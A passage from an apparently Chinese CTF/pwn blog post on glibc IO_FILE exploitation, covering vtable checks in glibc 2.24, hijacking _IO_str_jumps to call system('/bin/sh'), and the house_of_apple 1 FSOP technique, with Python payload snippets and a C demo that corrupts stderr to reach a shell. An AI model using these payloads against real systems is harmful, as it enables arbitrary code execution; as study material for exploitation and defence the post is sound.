l-&gt;l_ns !&#x3D; LM_ID_BASE))      return;  &#125;#else &#x2F;* !SHARED *&#x2F;  &#x2F;* We cannot perform vtable validation in the static dlopen case     because FILE * handles might be passed back and forth across the     boundary.  Therefore, we disable checking in this case.  *&#x2F;  if (__dlopen !&#x3D; NULL)    return;#endif  __libc_fatal (&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本没有什么可利用的点，由此可见只有将伪造的<code>vtable</code>地址放在<code>_IO_helper_jumps-_IO_str_chk_jumps+167</code>之间才能利用成功，这种情况下如果能将<code>vtable</code>设置成<code>_IO_str_jumps</code>或者<code>_IO_wstr_jumps</code>也可以调用文件操作函数来绕过<code>vtable</code>的检查并且<strong>不需要堆地址</strong>，一般常用的是<code>_IO_str_jumps</code></p><blockquote><p><code>_IO_str_jumps</code>是一个结构体，它定义了一系列函数指针，这些函数用于处理标准流（<code>stdin</code>，<code>stdout</code>，<code>stderr</code>）的输入输出操作。在C语言中，这些函数实现了不同的流操作，包括读取字符、写入字符、移动文件指针等。 <code>_IO_str_jumps</code>结构体通常用于实现C标准库中的标准流对象，例如<code>FILE</code>结构体（通过<code>FILE*_p</code>字段指向<code>_IO_str_jumps</code>），它提供了一些常用的操作函数，如<code>fgetc</code>、<code>fputc</code>等。</p></blockquote><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p _IO_str_jumps$2 &#x3D; &#123;  __dummy &#x3D; 0,  __dummy2 &#x3D; 0,  __finish &#x3D; 0x7ffff7a89fb0 &lt;_IO_str_finish&gt;,  __overflow &#x3D; 0x7ffff7a89c90 &lt;__GI__IO_str_overflow&gt;,  __underflow &#x3D; 0x7ffff7a89c30 &lt;__GI__IO_str_underflow&gt;,  __uflow &#x3D; 0x7ffff7a88610 &lt;__GI__IO_default_uflow&gt;,  __pbackfail &#x3D; 0x7ffff7a89f90 &lt;__GI__IO_str_pbackfail&gt;,  __xsputn &#x3D; 0x7ffff7a88640 &lt;__GI__IO_default_xsputn&gt;,  __xsgetn &#x3D; 0x7ffff7a88720 &lt;__GI__IO_default_xsgetn&gt;,  __seekoff &#x3D; 0x7ffff7a8a0e0 &lt;__GI__IO_str_seekoff&gt;,  __seekpos &#x3D; 0x7ffff7a88a10 &lt;_IO_default_seekpos&gt;,  __setbuf &#x3D; 0x7ffff7a88940 &lt;_IO_default_setbuf&gt;,  __sync &#x3D; 0x7ffff7a88c10 &lt;_IO_default_sync&gt;,  __doallocate &#x3D; 0x7ffff7a88a30 &lt;__GI__IO_default_doallocate&gt;,  __read &#x3D; 0x7ffff7a89ae0 &lt;_IO_default_read&gt;,  __write &#x3D; 0x7ffff7a89af0 &lt;_IO_default_write&gt;,  __seek &#x3D; 0x7ffff7a89ac0 &lt;_IO_default_seek&gt;,  __close &#x3D; 0x7ffff7a88c10 &lt;_IO_default_sync&gt;,  __stat &#x3D; 0x7ffff7a89ad0 &lt;_IO_default_stat&gt;,  __showmanyc &#x3D; 0x7ffff7a89b00 &lt;_IO_default_showmanyc&gt;,  __imbue &#x3D; 0x7ffff7a89b10 &lt;_IO_default_imbue&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>_IO_str_finish</code>的函数源码如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void_IO_str_finish (_IO_FILE *fp, int dummy)&#123;  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  fp-&gt;_IO_buf_base &#x3D; NULL;  _IO_default_finish (fp, 0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据源码可知，当<code>fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)</code>为真时，篡改<code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code>为<code>system</code>，<code>fp-&gt;_IO_buf_base</code>为<code>/bin/sh</code>即可<code>getshell</code>，同时还需要兼顾触发<code>_IO_flush_all_lockp</code>的条件</p><p>因此，一种伪造的条件如下</p><blockquote><p><code>fp-&gt;_mode</code> &lt;&#x3D; <code>0</code></p><p><code>fp-&gt;_IO_write_ptr</code> &gt;<code> fp-&gt;_IO_write_base</code></p><p><code>fp-&gt;_flags</code> &#x3D; <code>0</code></p><p><code>fp-&gt;_IO_buf_base</code> &#x3D; <code>bin_sh</code></p><p><code>fp + 0xe8</code> &#x3D; <code>system_addr</code></p><p><code>vtable</code> &#x3D; <code>_IO_str_jumps - 8</code></p></blockquote><p>其中<code>vtable</code>的设置是因为这样在调用<code>_IO_overflow</code>时会调用<code>_IO_str_finish</code>，<code>fp-&gt;_flags</code> &#x3D; <code>0</code>是因为<code>_IO_USER_BUF</code>是<code>1</code>，而<code>_s._free_buffer</code>的偏移就是<code>0xe8</code>，通过<code>_IO_str_finish</code>可以实现一个交互式的<code>shell</code></p><p><code>_IO_str_overflow</code>源码如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int_IO_str_overflow (_IO_FILE *fp, int c)&#123;  int flush_only &#x3D; c &#x3D;&#x3D; EOF;  _IO_size_t pos;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)      return flush_only ? 0 : EOF;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    &#123;      fp-&gt;_flags |&#x3D; _IO_CURRENTLY_PUTTING;      fp-&gt;_IO_write_ptr &#x3D; fp-&gt;_IO_read_ptr;      fp-&gt;_IO_read_ptr &#x3D; fp-&gt;_IO_read_end;    &#125;  pos &#x3D; fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;  if (pos &gt;&#x3D; (_IO_size_t) (_IO_blen (fp) + flush_only))    &#123;      if (fp-&gt;_flags &amp; _IO_USER_BUF) &#x2F;* not allowed to enlarge *&#x2F;return EOF;      else&#123;  char *new_buf;  char *old_buf &#x3D; fp-&gt;_IO_buf_base;  size_t old_blen &#x3D; _IO_blen (fp);  _IO_size_t new_size &#x3D; 2 * old_blen + 100;  if (new_size &lt; old_blen)    return EOF;  new_buf    &#x3D; (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);  ...&#125;libc_hidden_def (_IO_str_overflow)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，可以覆盖<code>*((_IO_strfile *) fp)-&gt;_s._allocate_buffer</code>为<code>system</code>，<code>new_size</code>为<code>/bin/sh</code>来<code>getshell</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">new_buf    &#x3D; (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因此，第二种伪造的条件如下：</p><blockquote><p><code>_flags</code>&#x3D;<code>0</code></p><p><code>_IO_write_base</code> &#x3D; <code>0</code></p><p><code>_IO_write_ptr</code> &#x3D; <code>(bin_sh -100) / 2 +1</code></p><p><code>_IO_buf_end</code> &#x3D; <code>(bin_sh -100) / 2</code> </p><p><code>_IO_buf_base</code> &#x3D; <code>0</code></p><p><code>fp + 0xe0</code> &#x3D; <code>system_addr</code></p></blockquote><p>总结：<code>2.24</code>中会检测<code>vtable</code>地址，因此只能利用原有的跳表，最常用的是<code>_IO_str_jumps</code> ，而利用方法有两种：</p><p>第一种：利用<code>IO_str_overflow</code> 函数会调用 <code>FILE+0xe0</code>处的地址，直接改为<code>ogg</code>或调用<code>system(&quot;/bin/sh&quot;)</code>，但这种利用可能会出问题</p><p>第二种：利用<code>_IO_str_finish</code>会以 <code>IO_buf_base</code>处的值为参数跳转至 <code>FILE+0xe8</code>处的地址，设置<code>vtable</code>为<code>IO_str_jumps-0x8</code>，发生异常时调用<code>IO_str_overflow</code>根据地址加偏移实际调用的是<code>_IO_str_finish</code>，伪造内容实现调用<code>system(&quot;/bin/sh&quot;)</code></p><p>示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#改_IO_str_finish</span>p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x200</span>p2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>io_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token number">2</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>io_str_jumps <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p3 <span class="token operator">=</span> p1 <span class="token operator">+</span> p2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#改_IO_str_overflow</span>p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x200</span>p2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>io_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bin_sh <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>io_str_jumps<span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc_2.31"></a>glibc_2.31</h2><p>高阶的<code>IO</code>利用，高版本中<code>__free_hook</code>、<code>__malloc_hook</code>、<code>__calloc_hook</code>都已经被取消，此时只能利用<code>IO</code></p><h3 id="house-of-apple-1（large-bin-attack-fsop）"><a href="#house-of-apple-1（large-bin-attack-fsop）" class="headerlink" title="house_of_apple 1（large bin attack + fsop）"></a>house_of_apple 1（large bin attack + fsop）</h3><p><strong>条件</strong>：能够泄露<code>libc</code>和<code>heap</code>地址且程序从<code>main</code>或<code>exit</code>函数结束</p><p><strong>过程</strong>：通过一次<code>large bin attack</code>劫持<code>_IO_list_all</code>替换为伪造的<code>IO_FILE</code>结构体，在程序结束的时候会遍历<code>_IO_list_all</code>中的结构体，执行结构体中的<code>vtable-&gt;overflow</code>指向的函数。其次可以利用<code>_wide_data</code>继续修改其他地方的值，在<code>_IO_FILE</code>中<code>_wide_data</code>的偏移是<code>0xa0</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_FILE_complete&#123;  struct _IO_FILE _file;  __off64_t _offset;  &#x2F;* Wide character stream stuff.  *&#x2F;  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;&#x2F;&#x2F;***  struct _IO_FILE *_freeres_list;  void *_freeres_buf;  size_t __pad5;  int _mode;  &#x2F;* Make sure we don&#39;t get into trouble again.  *&#x2F;  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造<code>_wide_data</code>中的值之后可以通过<code>_IO_wstrn_overflow</code>来将<code>overflow_buf</code>的值赋给<code>fp-&gt;_wide_data</code>，漏洞在于没有检查<code>fp-&gt;_wide_data</code>的合法性，而这两个都是可控的（通常伪造的<code>_IO_FILE</code>在堆上)，所以能够实现任意地址写</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">static wint_t_IO_wstrn_overflow (FILE *fp, wint_t c)&#123;  &#x2F;* When we come to here this means the user supplied buffer is     filled.  But since we must return the number of characters which     would have been written in total we must provide a buffer for     further use.  We can do this by writing on and on in the overflow     buffer in the _IO_wstrnfile structure.  *&#x2F;  _IO_wstrnfile *snf &#x3D; (_IO_wstrnfile *) fp;&#x2F;&#x2F;强转fp为_IO_wstrnfile类型   if (fp-&gt;_wide_data-&gt;_IO_buf_base !&#x3D; snf-&gt;overflow_buf)    &#123;      _IO_wsetb (fp, snf-&gt;overflow_buf,         snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)                      &#x2F; sizeof (wchar_t)), 0);&#x2F;&#x2F;有时候需要绕过       fp-&gt;_wide_data-&gt;_IO_write_base &#x3D; snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_base &#x3D; snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_ptr &#x3D; snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_end &#x3D; (snf-&gt;overflow_buf                      + (sizeof (snf-&gt;overflow_buf)                     &#x2F; sizeof (wchar_t)));    &#125;   fp-&gt;_wide_data-&gt;_IO_write_ptr &#x3D; snf-&gt;overflow_buf;  fp-&gt;_wide_data-&gt;_IO_write_end &#x3D; snf-&gt;overflow_buf;  &#x2F;&#x2F;将_IO_write_base、_IO_read_base、_IO_read_ptr、_IO_read_end、_IO_write_ptr、_IO_write_end都赋为overflow_buf      return c;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中,<code>overflow_buf</code>的偏移是<code>0xf0</code>即<code>vtable</code>后面，<code>_IO_wsetb</code>有时需要绕过<code>free</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)&#123;  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))    free (f-&gt;_wide_data-&gt;_IO_buf_base); &#x2F;&#x2F; ***  f-&gt;_wide_data-&gt;_IO_buf_base &#x3D; b;  f-&gt;_wide_data-&gt;_IO_buf_end &#x3D; eb;  if (a)    f-&gt;_flags2 &amp;&#x3D; ~_IO_FLAGS2_USER_WBUF;  else    f-&gt;_flags2 |&#x3D; _IO_FLAGS2_USER_WBUF;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>demo</code></strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span> <span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m[!] Backdoor is called!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">char</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] allocate two 0x200 chunks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token class-name">size_t</span> puts_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>puts<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] puts address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> libc_base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> <span class="token number">0x84420</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] libc base address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>libc_base_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token class-name">size_t</span> _IO_2_1_stderr_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x1ed5c0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] _IO_2_1_stderr_ address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_2_1_stderr_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token class-name">size_t</span> _IO_wstrn_jumps_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x1e8c60</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] _IO_wstrn_jumps address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_wstrn_jumps_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">char</span> <span class="token operator">*</span>stderr2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_2_1_stderr_addr<span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 1: change stderr->_flags to 0x800"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>stderr2 <span class="token operator">=</span> <span class="token number">0x800</span><span class="token punctuation">;</span>     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 2: change stderr->_mode to 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xc0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xd8</span><span class="token punctuation">)</span> <span class="token operator">=</span> _IO_wstrn_jumps_addr<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">;</span>     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 4: replace stderr->_wide_data with the allocated chunk p1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>p1<span class="token punctuation">;</span>     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p1 <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>p2<span class="token punctuation">;</span>     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p1 <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">;</span>     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 7: put backdoor at fake _wide_vtable->_overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2 <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 8: call fflush(stderr) to trigger backdoor func"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>说明</strong>：<code>_IO_list_all</code>中第一项就是<code>stderr</code>，首先需要满足<code>fsop</code>的要求</p><blockquote><p><code>_flags = 0x800</code></p><p><code>_mode = 1</code></p></blockquote><p>接下来改<code>stderr</code>的<code>vtable</code>为<code>_IO_wstrn_jumps-0x20</code>使得<code>_IO_wstrn_jumps</code>恰好落在<code>vtable-&gt;overflow</code>函数被执行</p><p>接着为了使<code>_wide_data</code>和<code>_wide_vtable</code>可控将它们改成两个堆的地址，并且在堆中伪造</p><blockquote><p><code>stderr-&gt;_wide_data = p1</code> </p><p><code>stderr-&gt;_wide_data-&gt;_wide_vtable = p2</code></p><p><code>stderr-&gt;_wide_data-&gt;_wide_vtable</code>中<code>_IO_write_ptr</code> &gt;  <code>IO_write_base</code></p><p><code>_wide_vtable-&gt;_overflow = backdoor</code></p></blockquote><p>最后刷新<code>_IO_list_all</code>就可以调用到<code>_IO_wstrn_jumps</code>中的<code>overflow</code>函数即<code>backdoor</code></p>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE</title>
      <link href="/2023/08/12/io-file/io-file/"/>
      <url>/2023/08/12/io-file/io-file/</url>
      
